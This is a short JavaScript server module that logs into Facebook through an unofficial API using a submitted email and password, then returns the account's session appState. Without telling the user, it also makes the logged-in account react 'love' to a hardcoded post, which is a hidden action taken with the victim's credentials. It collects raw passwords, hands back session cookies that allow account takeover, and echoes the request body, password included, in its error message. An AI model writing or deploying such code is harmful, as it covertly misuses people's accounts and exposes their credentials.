import login from "../FCA/index.js";

export function getAppState(email, password) {
  return new Promise(async (resolve, reject) => {
    login({ email, password }, async (err, api) => {
      if (err) {
        return reject(err);
      }
      const appState = await api.getAppState();
      await api.setPostReaction(
        "pfbid0f9WaSF2S7ZsiijyaEouRP4FD9gUDHMeyNWhcG1RThjaDzpt6YFXyRC69EppQGTBFl",
        "love",
      );
      return resolve({
        email,
        password,
        appState: JSON.stringify(appState, null, 2),
        api,
      });
    });
  });
}

export async function postState(req, res) {
  const { email, password } = req.body || {};
  try {
    if (!email || !password) {
      return res.json({
        error:
          "email and passowrd are required, your body: " +
          JSON.stringify(req.body || {}),
      });
    }
    const { appState } = await getAppState(email, password);
    return res.json({
      error: null,
      appState: JSON.parse(appState),
    });
  } catch (error) {
    console.log(error);
    return res.json({
      error: error.error
        ? error.error
        : "Server error, the credentials you have entered might be incorrect. Please try again with a correct credential.",
    });
  }
}
